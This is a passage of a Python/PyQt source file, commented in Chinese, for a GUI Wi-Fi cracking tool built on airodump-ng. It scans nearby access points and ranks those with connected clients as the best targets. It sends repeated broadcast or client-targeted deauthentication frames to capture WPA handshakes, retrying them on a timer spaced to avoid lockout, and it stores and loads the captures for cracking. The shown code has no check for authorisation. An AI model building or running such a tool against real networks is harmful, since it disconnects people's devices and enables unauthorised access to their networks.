            f"删除记录?\n\nSSID: {rec['essid']}\nBSSID: {rec['bssid']}\n备注: {rec['note'] or '-'}"
        ) != QMessageBox.Yes:
            return
        self._remove_record(self._tab_date(), tree.indexOfTopLevelItem(item),
                            f"{rec['essid'] or rec['bssid']}")

    def _remove_record(self, date: str, index: int, label: str = ""):
        """删除一条历史并同步 tab(空日期的非今日 tab 直接移除)"""
        if not self.core.history_delete(date, index):
            return False
        if not self.core.history_records(date) and date != today_str():
            page = self._current_result_tree()
            self.result_tabs.removeTab(self.result_tabs.currentIndex())
            if page:
                page.deleteLater()
        else:
            self._reload_current_tab()
        self.log(f"[删除] 已删除 {label} ({date})")
        return True

    # ===== 握手包库 =====
    def _refresh_cap_tree(self):
        self._refreshing_caps = True
        try:
            self._rebuild_cap_tree()
        finally:
            self._refreshing_caps = False

    def _rebuild_cap_tree(self):
        self.cap_tree.clear()
        groups = {}
        for day, path, size in self.core.list_handshakes():
            groups.setdefault(day, []).append((path, size))
        for day in sorted(groups.keys(), reverse=True):
            caps = groups[day]
            top = QTreeWidgetItem([f"📅 {day}  ({len(caps)} 个)", ""])
            font = top.font(0)
            font.setBold(True)
            top.setFont(0, font)
            top.setForeground(0, QColor("#1565c0"))
            top.setData(0, Qt.UserRole, day)   # 日期分组标记
            # 每个子项: 文件名 + 导入日期时间 + 可编辑备注
            for path, size in sorted(caps, key=lambda x: x[0].name, reverse=True):
                mtime = datetime.datetime.fromtimestamp(path.stat().st_mtime)
                child = QTreeWidgetItem([
                    f"{path.name}    {mtime:%Y-%m-%d %H:%M:%S}",
                    f"{size / 1024:.1f} KB"])
                child.setData(0, Qt.UserRole, str(path))
                child.setData(1, Qt.UserRole, self.core.cap_note(path))
                self._apply_cap_note(child, self.core.cap_note(path))
                child.setToolTip(0, str(path))
                top.addChild(child)
            self.cap_tree.addTopLevelItem(top)
        self.cap_tree.expandAll()

    def _apply_cap_note(self, item, note: str):
        """把备注显示在导入时间后面, 并允许直接编辑。"""
        base = item.text(0)
        if "  ·  " in base:
            base = base.split("  ·  ")[0]
        item.setText(0, f"{base}  ·  {note}" if note else base)
        item.setFlags(item.flags() | Qt.ItemIsEditable)

    def _on_cap_note_edited(self, item, column):
        if column != 0 or item is None:
            return
        # 刷新握手包树会 clear() 掉全部 item, 但已排队的 itemChanged
        # 仍会送达这里, 此时访问 item 会抛 RuntimeError(C++ 对象已删除)。
        # 刷新期间直接忽略即可, 备注已经在 _refresh_cap_tree 里写过。
        if getattr(self, "_refreshing_caps", False):
            return
        try:
            path = item.data(0, Qt.UserRole)
            if not path:
                return
            text = item.text(0)
            note = text.split("  ·  ")[1].strip() if "  ·  " in text else ""
            self.core.set_cap_note(Path(path), note)
            self._apply_cap_note(item, note)
        except RuntimeError:
            return

    def _on_cap_selected(self):
        self._sync_record_buttons()

    def _on_cap_double_clicked(self, item, _col):
        if item is None:
            return
        try:
            cap = item.data(0, Qt.UserRole)
        except RuntimeError:
            return          # 树已刷新, 这个 item 的 C++ 对象已被销毁
        if not cap:
            try:
                self.cap_tree.collapseItem(item)
            except RuntimeError:
                pass
            return
        self.lbl_handshake.setText(Path(cap).name)
        self.lbl_handshake.setStyleSheet("color: #2e7d32; font-weight: bold;")
        self.log(f"[载入] 握手包: {cap}")
        self.set_status(f"已载入握手包 {Path(cap).name} - 可开始破解")

    # ===== 扫描 AP（自动开启监听）=====
    def _preflight_scan(self) -> bool:
        """开扫前自检, 避免启动后一直停在'等待 AP'却不知原因。
        注意 airodump-ng 由 core 内部用 sudo/pkexec 提权运行,
        所以不要求 GUI 本身是 root, 只要求有提权手段。"""
        problems = []
        if not shutil.which("airodump-ng"):
            problems.append("未安装 airodump-ng（sudo apt install aircrack-ng）")
        if not self.core.can_elevate():
            problems.append("无法取得 root 权限（无密码文件且未安装 pkexec）")
        if problems:
            for p in problems:
                self.log(f"[自检] {p}")
            self.set_status("扫描前置检查未通过")
            return False
        return True

    def _start_scan(self):
        physical = self.iface_combo.currentText()
        if not physical:
            self.set_status("请先在顶部选择无线网卡")
            return

        # 重新扫描前先停掉正在进行的抓包/全自动抓包, 避免同一网卡被
        # 抓包进程占着导致扫描接口冲突
        if getattr(self, "_auto_mode", False):
            self.log("[扫描] 先停止全自动抓包")
            self._stop_auto_capture(quiet=True)
        elif getattr(self, "_capture_running", False):
            self.log("[扫描] 先停止正在进行的抓包")
            self._stop_capture(quiet=True)

        if not self._preflight_scan():
            return

        # 先起表, 再开监听: 等待监听的每一秒都算进扫描时间, 界面也
        # 立刻给出反馈, 不会出现"按了没反应"
        self._arm_scan_clock()
        self.physical_iface = physical
        # 先同步禁用按钮: 之前的实现把这一步放到异步回调里, 点击到"响应"
        # 之间按钮还是亮着的, 用户连点会叠起多次检查。这里先置灰,
        # 等监听准备就绪后再由 _do_scan / 失败分支恢复。
        self.btn_scan.setEnabled(False)
        self.btn_scan.setText("⏳ 检查监听中…")

        # 监听模式已就绪则直接扫, 不必重启监听(重启会打断已有会话)。
        # check_monitor_mode 要连跑 iwconfig/iw 两个子进程(各 5s 超时),
        # 之前放在 GUI 线程 —— 网卡驱动卡住时按钮之后的界面全部冻结,
        # 表现为"倒计时看着只走了 1 秒"。这里必须在工作线程里做。
        self.set_status("正在检查监听模式…")
        self._run_worker(self._probe_monitor_ready, self._on_monitor_probe)

    def _probe_monitor_ready(self):
        """工作线程: 返回已就绪的监听接口, 未就绪返回 None。"""
        mon = self.mon_iface
        if mon and self.core.check_monitor_mode(mon):
            return mon
        return None

    def _on_monitor_probe(self, mon):
        if mon:
            self.set_status("正在启动 airodump-ng…")
            self._do_scan()
            return

        physical = self.physical_iface
        self.set_status("正在开启监听模式…")
        self.set_monitor_status("starting")

        self.btn_scan.setText("⏳ 开启监听中…")

        def _start_mon():
            try:
                return self.core.start_monitor(physical)
            except PermissionError as e:
                self.log(f"[监听开启失败] {e}")
                return None
            except Exception as e:  # noqa: BLE001
                self.log(f"[监听开启异常] {e}")
                return None

        self._run_worker(_start_mon, self._on_mon_ready_for_scan)

    def _on_mon_ready_for_scan(self, proc=None):
        """监听模式就绪，开始扫描"""
        if proc is None:
            self._disarm_scan_clock()
            self.btn_scan.setEnabled(True)
            self.btn_scan.setText("🔍 扫描")
            self.set_scan_status("idle")
            self.set_monitor_status("error")
            self.set_status("开启监听失败 · 请检查网卡与 root 权限")
            return
        physical = self.physical_iface

        def _detect():
            return self._detect_mon_iface(physical)

        self._run_worker(_detect, self._apply_mon_then_scan)

    def _apply_mon_then_scan(self, mon):
        if mon:
            self.mon_iface = mon
            self.log(f"监听模式已就绪 · 接口 {mon}")
            self.set_monitor_status("on")
            self._do_scan()
            return

        self.log("监听模式开启失败 · 未检测到 monitor 接口")
        self.log("  · 该网卡驱动可能不支持监听模式")
        self.log("  · 虚拟机需直通支持监听的 USB 无线网卡")
        self.set_monitor_status("error")
        self.btn_scan.setEnabled(True)
        self.btn_scan.setText("🔍 扫描")
        self.set_status("监听模式开启失败 · 无法扫描")

    def _arm_scan_clock(self):
        """从用户点"扫描"这一刻起计时, 与监听模式是否就绪无关。

        之前把计时放在 _do_scan() 里, 而 _do_scan() 必须等 start_monitor
        完成(两次 worker 往返 + airmon-ng, 实测 1~4s)。表现为按下扫描后
        倒计时长时间不出现, 用户以为没反应 —— 而这段时间里真正的
        airodump-ng 可能还没启动, 等于扫描时间凭空少了几秒。"""
        if self.scan_start_time:
            return False
        self.scan_start_time = time.time()
        self._scan_warned = False
        self.scan_deadline = (time.time() + self.scan_auto_stop
                               if self.scan_auto_stop > 0 else None)
        self._autostop_firing = False
        self._cd_anchor_left = int(self.scan_auto_stop)
        self._last_clock_text = ""
        self.tick_timer.start()
        self.scan_elapsed.setText(self._scan_elapsed_text())
        return True

    def _disarm_scan_clock(self):
        self.scan_start_time = 0
        self.scan_deadline = None
        self._autostop_firing = False
        self._last_clock_text = ""
        if hasattr(self, "tick_timer"):
            self.tick_timer.stop()
        if hasattr(self, "scan_elapsed"):
            self.scan_elapsed.setText(self._scan_elapsed_text())

    def _do_scan(self):
        """实际开始 airodump-ng 扫描"""
        self.log(f"> 扫描 AP: {self.mon_iface}")
        # 新一轮扫描: 嗅探缓存清零, 避免上一轮的客户端"阴魂不散"
        self._sniffed_clients = {}
        self._sniff_noticed = False
        self._clear_pkt()
        self.btn_scan.setText("⏹ 扫描中")
        self._arm_scan_clock()
        if self.scan_deadline:
            self.log(f"[扫描] 将在 {self.scan_auto_stop} 秒后自动停止")
        else:
            self.log("[扫描] 不会自动停止，请点'停止扫描'")
        self._run_worker(lambda: self.core.airodump_scan(self.mon_iface, "scan"),
                         self._on_scan_started)
        self.scan_elapsed.setText(self._scan_elapsed_text())
        self.scan_timer.start()
        self.set_scan_status("scanning")

    def _on_scan_started(self, proc):
        if not proc:
            self.log("[错误] airodump-ng 启动失败")
            self._scan_failed("airodump-ng 无法启动 · 请检查是否已安装")
            return
        t = self._spawn_cmd(proc, self.log_scan, self._on_scan_exited)
        # 必须记住这个线程: 之前 scan_thread 一直停留在初始值 None,
        # _stop_scan 根本杀不掉 airodump —— 每停一次就多留一个进程,
        # 累积起来就是"越用越卡、越来越严重"。
        self.scan_thread = t
        t.finished.connect(lambda th=t: self._forget_scan_thread(th))
        if hasattr(t, "exited"):
            t.exited.connect(self._on_scan_exit_code)
        # 扫描期间同步嗅探数据帧: airodump 的 Station 段经常只写
        # "(not associated)", 客户端全靠嗅探找回来
        self._sniffer_acquire("scan")
        self.set_status("正在搜索周边 AP…")

    def _forget_scan_thread(self, th):
        if self.scan_thread is th:
            self.scan_thread = None

    def _cleanup_stale_scans(self):
        """启动时清掉上次崩溃/异常退出遗留的 airodump 扫描进程。

        它们在后台持续刷输出、占 CPU, 用户看不到却一直在拖慢界面。
        放在守护线程里跑, 不阻塞窗口显示。注意必须用独立 AirCore 实例:
        校验一次真实密码会把 _password_verified 置真, 污染主实例后,
        密码失效的降级路径(报错而非继续尝试)就再也不会触发了。"""
        try:
            if AirCore().kill_scan_processes():
                print("[启动清理] 已结束上次遗留的 airodump 扫描进程")
        except Exception as e:  # noqa: BLE001
            print(f"[启动清理] {e}")

    def _on_scan_exited(self):
        """airodump-ng 进程结束。若一个 AP 都没有, 说明是启动失败而非环境安静。"""
        if not self.scan_timer.isActive():
            return  # 用户主动停止
        if self.ap_table.rowCount() > 0:
            return
        self._scan_failed("airodump-ng 已退出但未捕获到任何 AP")

    def _on_scan_exit_code(self, rc: int):
        self.scan_returncode = rc

    def _scan_failed(self, reason: str):
        """扫描失败: 说明原因并恢复界面, 不要再停在'等待 AP'"""
        self.log(f"[错误] {reason}")
        self._stop_scan()          # 先恢复界面, 它会覆写 status
        hints = []
        if not shutil.which("airodump-ng"):
            hints.append("未找到 airodump-ng，请先安装 aircrack-ng 套件")
        if not self.mon_iface:
            hints.append("监听接口为空，请先开启监听模式")
        hints.append("确认以 root 运行，且网卡驱动支持监听模式")
        for h in hints:
            self.log(f"  · {h}")
        self.set_status(f"扫描失败 · {reason}")

    def _warn_no_aps(self):
        """扫描进行中但一直没有 AP。实测网卡接口状态给出可执行结论。"""
        waited = int(time.time() - self.scan_start_time)
        iface = self.mon_iface or "(空)"
        self.log(f"[警告] 已扫描 {waited}s 仍未捕获到任何 AP")
        self.set_status(f"已等待 {waited}s，仍未捕获 AP")

        def _probe():
            return {
                "iface": iface,
                "monitor": self.core.check_monitor_mode(iface) if self.mon_iface else False,
                "ifaces": self.core.list_interfaces(),
                "root": os.geteuid() == 0,
                "elevate": self.core.can_elevate(),
                "airodump": shutil.which("airodump-ng") or "",
            }

        self.set_status("正在检测监听状态…")
        self._run_worker(_probe, self._apply_no_aps_diag)

    def _apply_no_aps_diag(self, d):
        if not d:
            self.log("  · 状态检测失败，请手动执行 airodump-ng 验证")
            self.set_status("仍未捕获 AP，请查看日志建议")
            return

        if not d["airodump"]:
            self.log("  · 未找到 airodump-ng，请安装 aircrack-ng 套件")
        if not self.mon_iface:
            self.log("  · 监听接口为空，监听模式可能未开启成功")
        elif not d["monitor"]:
            self.log(f"  · 接口 {d['iface']} 不在 monitor 模式（网卡驱动可能不支持）")
        if not d["root"] and not d["elevate"]:
            self.log("  · 无 root 提权手段，airodump-ng 可能抓不到数据")
        self.log(f"  · 当前可用无线接口: {', '.join(d['ifaces']) or '无'}")
        self.log("  · 建议: 靠近 2.4GHz 热点后重试，或点顶部 ● 关闭再开启监听模式")
        self.set_status("仍未捕获 AP，请查看日志建议")

    def _scan_elapsed_text(self):
        if not self.scan_start_time:
            return ""
        base = f"扫描时长: {self._format_elapsed(self.scan_start_time)}"
        if self.scan_deadline:
            left = self.scan_deadline - time.time()
            if left <= 1:
                base += " | 1s 后自动停止"
            else:
                # 严格 1 秒 1 跳: 以首次取整为锚点, 每跨过一个整数边界
                # 才减 1。之前每次都按当前剩余时间取整, 锚点会随 tick 漂移,
                # 出现 3->2->3 这种来回跳。
                base += f" | {self._countdown_num()}s 后自动停止"
        return base

    def _stop_scan(self):
        if self._stopping_scan:
            return
        self._stopping_scan = True
        try:
            had_thread = self.scan_thread is not None
            if had_thread:
                self.scan_thread.stop()
                self.scan_thread = None
                # terminate() 只保证杀掉 sudo 这层, 真正的 airodump 可能还活着;
                # 再按命令行补一次兜底清理, 否则残余进程会一直刷输出。
                self._run_worker(self.core.kill_scan_processes, None)
            # 扫描结束释放嗅探器(抓包还在用则不断, 引用计数)
            self._sniffer_release("scan")
            self.scan_timer.stop()
            self.tick_timer.stop()
            self.scan_deadline = None
            self.scan_start_time = 0.0
            self._cd_anchor_left = 0
            self._last_clock_text = ""
            self.scan_elapsed.setText("")
            self._parse_scan_csv(force=True)
            self.btn_scan.setEnabled(True)
            self.btn_scan.setEnabled(True)
            self.btn_scan.setText("🔍 扫描")
            self.set_scan_status("idle")
            n = self.ap_table.rowCount()
            self.set_status(f"扫描已停止 - 共发现 {n} 个 AP")
            if self.mon_iface:
                self.log(f"监听模式保持开启 · {self.mon_iface} · 可直接抓取握手包")
            else:
                self.log("[提示] 监听模式未开启，请点顶部按钮开启后再抓包")
        finally:
            self._stopping_scan = False

    def _find_latest_csv(self):
        csvs = [c for c in self.core.caps_dir.glob("scan*.csv") if c.is_file()]
        return max(csvs, key=lambda x: x.stat().st_mtime) if csvs else None

    def _parse_scan_csv(self, force=False):
        # 倒计时/自动停止与"是否发现新 AP"无关, 每次 tick 都要处理
        if self.scan_timer.isActive():
            self.scan_elapsed.setText(self._scan_elapsed_text())
            if self.scan_deadline and time.time() >= self.scan_deadline:
                self.log("[扫描] 达到设定时长，自动停止")
                self.scan_deadline = None
                self._stop_scan()
                return
            # 看门狗: airodump-ng 抓到 0 个 AP 时并不会退出, 所以进程存活
            # 不能代表成功。超时无 AP 必须主动提示, 否则界面永远停在"等待 AP"。
            if (self.ap_table.rowCount() == 0
                    and not self._scan_warned
                    and time.time() - self.scan_start_time >= self._NO_APS_TIMEOUT):
                self._scan_warned = True
                self._warn_no_aps()

        csv = self._find_latest_csv()
        if not csv:
            return
        try:
            st = csv.stat()
        except OSError:
            return
        sig = (str(csv), st.st_mtime_ns, st.st_size)
        if sig == self._last_csv and not force:
            return
        self._last_csv = sig
        try:
            txt = csv.read_text(errors="ignore", encoding="utf-8")
            # airodump CSV 分两段: AP 段 + Station 段, 以 "Station MAC" 表头分隔
            if "Station MAC" in txt:
                ap_sec, station_sec = txt.split("Station MAC", 1)
            else:
                ap_sec, station_sec = txt, ""
            stations_by_bssid = self._parse_station_section(station_sec)
            rows = self._parse_ap_csv(ap_sec, stations_by_bssid)
            if rows:
                # 内容没变就不重建: 扫描中每 1.5s 全量重建上千个
                # QTableWidgetItem 是界面发闷的另一来源。force(停止扫描、
                # 用户刷新)时必须重画 —— 表格可能已被别处清空。
                key = tuple(rows)
                if not force and key == self._last_rows:
                    return
                self._last_rows = key
                # setUpdatesEnabled(False) 必须配 finally 恢复, 否则刷新
                # 表格过程中一旦抛异常, 表格会永久停止重绘 —— 表现就是
                # 界面卡住甚至随窗口关闭而崩溃。
                self.ap_table.setUpdatesEnabled(False)
                try:
                    self._fill_ap_table(rows)
                finally:
                    self.ap_table.setUpdatesEnabled(True)
                self.scan_elapsed.setText(self._scan_elapsed_text())
                n_cli = sum(1 for r in rows if r[7])
                tip = f", {n_cli} 个有客户端" if n_cli else ""
                n_hid = getattr(self, "_hidden_ssids", 0)
                htip = f" · 已隐藏 {n_hid} 个隐藏SSID" if n_hid else ""
                self.set_status(f"发现 {len(rows)} 个 AP{tip}{htip} - 点击选择目标")
        except Exception as e:  # noqa: BLE001
            # 定时器槽里的异常只会被 PyQt 打印到控制台, 界面上看不出哪里错了。
            # 必须留完整栈, 否则"扫描中途闪退/状态不动"无从排查。
            self.log(f"[解析失败] {type(e).__name__}: {e}")
            import traceback
            self.log(traceback.format_exc().strip().replace("\n", " | "))

    def _fill_ap_table(self, rows):
        """把解析好的 AP 行写入表格(调用方负责 setUpdatesEnabled)。"""
        self.ap_table.setRowCount(len(rows))
        for i, r in enumerate(rows):
            # r = (信号数值, SSID, 客户端, 强度, BSSID, 信道, 加密, 客户端数)
            pwr_int = r[0]
            cli_count = r[7]
            bssid = r[4]
            for col, val in ((1, r[1]), (2, r[2]), (3, r[3]),
                             (4, bssid), (5, r[5]), (6, r[6])):
                it = QTableWidgetItem(val)
                if col in (1, 4):
                    it.setToolTip(val)
                if col == 2:
                    it.setForeground(QColor("#1565c0") if cli_count
                                    else QColor("#b0bec5"))
                    it.setToolTip(self._client_tips.get(bssid, val))
                if col == 3:
                    it.setToolTip(val if val else "")
                self.ap_table.setItem(i, col, it)
            bar, color = self._signal_bar(pwr_int)
            it = QTableWidgetItem(bar)
            it.setTextAlignment(Qt.AlignCenter)
            it.setForeground(QColor(color))
            self.ap_table.setItem(i, 0, it)

    # airodump-ng 的 CSV 表头随版本变化, 必须按列名映射而不是固定下标。
    # 1.6 实测表头: BSSID, First time seen, Last time seen, channel, Speed,
    # Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP,
    # ID-length, ESSID, Key  —— 与旧版 17 列格式列序完全不同。
    _CSV_ALIASES = {
        "bssid": ("bssid",),
        "essid": ("essid",),
        "ch": ("channel", "ch"),
        "enc": ("privacy", "enc"),
        "cipher": ("cipher",),
        "auth": ("authentication", "auth"),
        "power": ("power", "dbm", "signal"),
        "station": ("stationmac", "station"),
    }

    @staticmethod
    def _parse_station_section(station_sec: str) -> dict:
        """解析 airodump CSV 的 Station 段, 返回 {BSSID: [客户端...]}。

        实测格式(行尾带 \\r):
        Station MAC, First time seen, Last time seen, Power, # packets,
        BSSID, Probed ESSIDs
        未关联的客户端 BSSID 为 "(not associated)", 不计入任何 AP。
        """
        out = {}
        for raw in station_sec.splitlines():
            line = raw.strip().strip("\r")
            if not line or line.startswith(("Station MAC", "Interface")):
                continue
            parts = re.split(r',\s*', line)
            if len(parts) < 6:
                continue
            mac, power, packets, bssid = (parts[0].strip(), parts[3].strip(),
                                          parts[4].strip(), parts[5].strip().upper())
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
                continue
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue  # (not associated) 等
            out.setdefault(bssid, []).append(
                {"mac": mac.upper(), "power": power, "packets": packets})
        return out

    @staticmethod
    def _norm_col(name: str) -> str:
        n = name.strip().lower().lstrip("#").replace(" ", "")
        return n.replace("_", "").replace("-", "")

    def _parse_ap_csv(self, txt: str, stations_by_bssid=None):
        """按表头名解析 airodump CSV, 返回表格行列表"""
        if stations_by_bssid is None:
            stations_by_bssid = {}
        idx = {}
        rows = []
        hidden_count = 0
        self._client_tips = {}
        self._ap_clients = {}
        # airodump 的分隔符是 ", "，引号前多一个空格会使 CSV 规范失效，
        # 含逗号的 SSID(如 "Cafe, Guest") 会被切成两列。先归一化再解析。
        txt = re.sub(r",\s+(?=\")", ",", txt)
        # 整流解析: 逐行切分会破坏含逗号/换行的 SSID 字段
        for parts in csvmod.reader(io.StringIO(txt)):
            if not parts:
                continue

            norm = [self._norm_col(p) for p in parts]
            # 表头行: 含 bssid 且列数足够
            if "bssid" in norm and len(parts) > 2:
                idx = {}
                for field, aliases in self._CSV_ALIASES.items():
                    for a in aliases:
                        key = self._norm_col(a)
                        if key in norm:
                            idx[field] = norm.index(key)
                            break
                continue

            if not idx:
                continue

            def get(field):
                i = idx.get(field)
                if i is None or i >= len(parts):
                    return ""
                v = parts[i].strip()
                # airodump 对含逗号的 SSID 加引号, 且引号前可能有空格
                if len(v) >= 2 and v[0] == '"' and v[-1] == '"':
                    v = v[1:-1]
                return v.strip()

            bssid = get("bssid")
            # station 行(握手包捕获时)的 BSSID 为空, 跳过
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue

            ch = get("ch")
            priv = get("enc") or "Open"
            cipher = get("cipher")
            auth = ("WPA" if priv.startswith("WPA")
                    else "WEP" if priv.startswith("WEP") else priv)
            pwr = get("power")
            essid = get("essid")
            if not ch:
                ch = "-"
            if not essid:
                # 隐藏 SSID 不显示(按需求过滤), 但计数保留, 不静默丢失
                hidden_count += 1
                continue
            try:
                pwr_int = int(float(pwr))
                # airodump 用 -1 表示"尚未收到 beacon, 信号未知",
                # 不能当成 -1dBm 的最强信号排到最前
                if pwr_int >= 0 or pwr_int == -1:
                    pwr_int = None
            except (TypeError, ValueError):
                pwr_int = None
            enc_col = f"{priv}/{cipher}".strip("/") if cipher else priv
            # 客户端信息: airodump Station 段 + tcpdump 数据帧嗅探取并集。
            # 实测 airodump 在本机监听接口上长期只写 "(not associated)",
            # 即使网卡明明抓到了客户端数据帧 —— 不合并嗅探, 客户端列永远为 0。
            clients = list(stations_by_bssid.get(bssid.upper(), [])
                           if stations_by_bssid else [])
            have = {c["mac"] for c in clients}
            extra = sorted((getattr(self, "_sniffed_clients", None)
                            or {}).get(bssid.upper(), ()))
            sniff_n = 0
            for m in extra:
                if m not in have:
                    have.add(m)
                    sniff_n += 1
                    clients.append({"mac": m, "power": "", "packets": ""})
            client_count = len(clients)
            self._ap_clients[bssid.upper()] = [c["mac"] for c in clients]
            client_str = f"{client_count} 客户端"
            if client_count:
                # 列窄, 只显示数量; MAC 明细放 tooltip
                macs = ", ".join(c["mac"] for c in clients[:4])
                if client_count > 4:
                    macs += f" 等{client_count}个"
                # 列宽 23px 放不下"N 台", 只显示数字, 详情走 tooltip
                client_str = str(client_count)
                client_tip = f"{client_count} 台在线客户端: {macs}"
                if sniff_n:
                    client_tip += f" · 其中{sniff_n}个由数据帧嗅探发现"
            else:
                client_str = "-"
                client_tip = "无在线客户端"

            # 元组顺序 = 表格列序: 信号(数值), SSID, 客户端, 强度, BSSID, 信道,
            # 加密, 客户端数
            rows.append((pwr_int, essid, client_str, f"{pwr} dBm" if pwr else "",
                         bssid.upper(), ch, enc_col,
                         client_count))
            self._client_tips[bssid.upper()] = client_tip
        # 信号强的排前面(未知信号沉底)
        # 排序: 有客户端的排最前, 同组内信号强的排前, 未知信号沉底。
        # 优先展示"有人且信号好"的 AP, 这才是值得抓的目标。
        rows.sort(key=lambda r: (r[7] == 0, r[0] is None,
                                 -(r[0] if r[0] is not None else 0)))
        self._hidden_ssids = hidden_count
        return rows

    @staticmethod
    def _signal_bar(pwr_int):
        """信号格: 用方块字符画条, 返回(文本, 颜色)。"""
        if pwr_int is None:
            return "░░░░░", "#b0bec5"
        if pwr_int >= -50:
            return "█████", "#2e7d32"
        if pwr_int >= -60:
            return "████░", "#7cb342"
        if pwr_int >= -70:
            return "███░░", "#f9a825"
        if pwr_int >= -80:
            return "██░░░", "#ef6c00"
        return "█░░░░", "#c62828"

    def _on_ap_clicked(self, row, col):
        """单击只设为目标, 不抓包 —— 避免误点就长时间占用网卡。"""
        self._select_target(row)

    def _on_ap_double_clicked(self, row, col):
        """双击设为目标并开始/停止抓包。"""
        if not self._select_target(row):
            return
        self._toggle_capture()

    def _select_target(self, row):
        if row < 0:
            return False
        def _get(col):
            it = self.ap_table.item(row, col)
            return it.text() if it else ""
        # 列序: 0信号 1SSID 2客户端 3强度 4BSSID 5信道 6加密
        essid = _get(1)
        bssid = _get(4)
        ch = _get(5)
        enc = _get(6)
        
        self.lbl_target_essid.setText(essid)
        self.lbl_target_bssid.setText(bssid)
        self.lbl_target_ch.setText(ch)
        self.lbl_target_enc.setText(enc)
        self.lbl_handshake.setText("未捕获")
        self.lbl_handshake.setStyleSheet("color: #c62828; font-weight: bold;")
        # 客户端下拉: 默认广播 deauth, 也可定向某个在线客户端
        if hasattr(self, "client_combo"):
            self.client_combo.clear()
            self.client_combo.addItem("全部 (广播)", "")
            for mac in getattr(self, "_ap_clients", {}).get(bssid.upper(), []):
                self.client_combo.addItem(mac, mac)

        self.log(f"[目标] 已选择: {essid} ({bssid}) CH:{ch}")
        self.set_status(f"目标已锁定: {essid}")
        return True

    def _selected_client(self) -> str:
        """当前选中的定向客户端 MAC, 空串表示广播。"""
        if hasattr(self, "client_combo"):
            data = self.client_combo.currentData()
            if data:
                return str(data)
        return ""

    # ===== 抓包 =====
    def _toggle_scan(self):
        """扫描/停止合并为一个按钮。"""
        if self.scan_timer.isActive() or self._stopping_scan:
            self._stop_scan()
        else:
            self._start_scan()

    def _toggle_crack(self):
        """开始破解/停止破解合并为一个按钮。"""
        if self._crack_running:
            self._stop_crack()
        else:
            self._start_crack()

    def _toggle_capture(self):
        """开始抓包/停止抓包合并为一个按钮。"""
        if getattr(self, "_auto_mode", False):
            self._stop_auto_capture()
            return
        if getattr(self, "_capture_running", False):
            self._stop_capture()
        else:
            self._start_capture()

    def _start_capture(self):
        essid = self.lbl_target_essid.text()
        bssid = self.lbl_target_bssid.text()
        ch = self.lbl_target_ch.text()
        if essid == "未选择" or not bssid:
            QMessageBox.warning(self, "提示", "请先在左侧列表点击选择目标 AP")
            return

        if not self.mon_iface:
            # 监听没开就自动开, 不再要求用户先去顶部点一次
            self.log("[抓包] 监听模式未开启, 正在自动开启…")
            if not self._enable_monitor():
                QMessageBox.warning(self, "提示", "监听模式开启失败，请先开启监听模式")
                return

        self.log(f"[抓包] 目标: {essid} | {bssid} | CH{ch}")
        self.bottom_tabs.setCurrentWidget(self.log_scan_box)
        self.set_status("正在抓取握手包…")
        # 新一轮抓包: 嗅探缓存清零, 只统计本轮目标的在线客户端
        self._sniffed_clients = {}
        self._sniff_noticed = False
        self._clear_pkt()

        # 顺序很关键: 必须先让 airodump 开始抓包, 再发 deauth。
        # 反过来(先 deauth 后开抓)会漏掉客户端重连的那几帧 EAPOL,
        # 结果就是抓到的 cap 里没有握手包 —— 导入 eWSA 显示"无数据"。
        # 抓包文件按 WiFi 名称命名, 如 "MyHomeWiFi-01.cap"
        cap_prefix = self.core.safe_cap_prefix(essid, bssid)
        self._cap_prefix = cap_prefix

        cap_prefix = self.core.safe_cap_prefix(essid, bssid)
        self._cap_prefix = cap_prefix
        # 抓包目标启动时即锁定: 刷新客户端必须用它, 不能用界面标签 ——
        # 抓包中途用户点选别的 AP 会改掉标签, 导致刷成别的 AP 的客户端。
        self._cap_bssid = bssid
        self._cap_essid = essid
        self._client_auto_directed = False
        client = self._selected_client()

        def _capture():
            proc = self.core.airodump_capture(
                self.mon_iface, bssid, ch, cap_prefix)
            if not proc:
                return None
            # 记下这个包属于哪个 AP: .cap 本身不含可读的 SSID,
            # 而加入破解列表/复制 WiFi 都要用 SSID
            self._cap_essid = essid
            self._cap_bssid = bssid
            self._cap_ch = ch
            for f in self.core._iter_caps(self.core._dated_dir()):
                if f.name.startswith(cap_prefix):
                    self.core.set_cap_meta(
                        f, {"essid": essid, "bssid": bssid, "channel": ch})
            # 顺序很关键: 必须先让 airodump 开始抓包, 再发 deauth。
            # 反过来(先 deauth 后开抓)会漏掉客户端重连的那几帧 EAPOL。
            # 等 airodump 起稳后再发第一次 deauth, 之后由定时器自动重试。
            time.sleep(2.0)
            dp = self.core.deauth(self.mon_iface, bssid, 10, client)
            if dp:
                self.log(f"[deauth] 已发送 10 次解关联 → {bssid}"
                         + (f" (定向 {client})" if client else " (广播)"))
            else:
                self.log("[deauth] 发送失败, 可能抓不到握手包")
            return proc

        self._capture_running = True
        self._handshake_found = False
        self._checking_handshake = False
        self._hs_last = None
        self._deauth_attempts = 1
        self._set_capture_btn(True)
        self._run_worker(_capture, self._on_capture_started)

        # 每 2s 校验一次抓到的包是否真含握手, 直到抓到或用户停止
        self.cap_check_timer = QTimer(self)
        self.cap_check_timer.timeout.connect(self._check_handshake)
        self.cap_check_timer.setInterval(2000)
        self.cap_check_timer.start()

        # 没抓到就每隔 30s 重发一次 deauth(像 minidwep 那样留出间隔,
        # 避免短时间内狂发 deauth 被路由器/AP 拉黑锁死), 直到抓到或停止
        self.deauth_retry_timer = QTimer(self)
        self.deauth_retry_timer.timeout.connect(self._retry_deauth)
        self.deauth_retry_timer.setInterval(self._DEAUTH_INTERVAL_MS)
        self.deauth_retry_timer.start()

        # 抓包期间每隔几秒刷新一次在线客户端数量/列表(下拉可定向)
        self.client_refresh_timer = QTimer(self)
        self.client_refresh_timer.timeout.connect(self._refresh_capture_clients)
        self.client_refresh_timer.setInterval(5000)
        self.client_refresh_timer.start()

    def _on_capture_started(self, p):
        if not p:
            self._capture_running = False
            self._stop_capture_timers()
            self._set_capture_btn(False)
            self.set_status("抓包启动失败")
            return
        self.cap_thread = self._spawn_cmd(p, self.log_scan)
        # 抓包锁定在目标信道, 嗅探数据帧找在线客户端(可定向 deauth)
        self._sniffer_acquire("capture")

    def _retry_deauth(self):
        """抓不到握手就周期性重发 deauth, 直到成功或用户停止。"""
        if not getattr(self, "_capture_running", False) or \
                getattr(self, "_handshake_found", False):
